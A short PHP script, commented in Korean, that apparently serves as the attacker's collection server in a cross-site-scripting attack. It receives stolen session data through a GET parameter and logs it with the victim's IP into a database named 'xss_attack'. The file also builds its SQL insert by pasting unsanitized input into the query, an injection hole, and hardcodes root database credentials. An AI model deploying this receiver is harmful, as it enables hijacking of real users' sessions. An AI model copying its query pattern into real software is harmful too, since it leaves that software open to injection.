<?php
// 데이터베이스 연결 설정
// localhost에 root 계정으로 xss_attack 데이터베이스에 접속
$db_conn = new mysqli("127.0.0.1", "root", "123456", "xss_attack");

// GET 방식으로 전달된 'data' 파라미터 값을 가져옴
$session = $_GET["data"];
// 접속한 클라이언트의 IP 주소를 가져옴
$remote_ip = $_SERVER["REMOTE_ADDR"];

// 세션 데이터가 비어있지 않은 경우에만 실행
if(!empty($session)) {
    // session_list 테이블에 현재 시간, IP 주소, 세션 데이터를 저장하는 쿼리 생성
    // now(): 현재 시간을 반환하는 MySQL 함수
    $query = "insert into session_list values(now(), '{$remote_ip}', '{$session}')";
    // 생성된 쿼리를 실행
    $db_conn->query($query);
}

// 데이터베이스 연결 종료
$db_conn->close();
?>
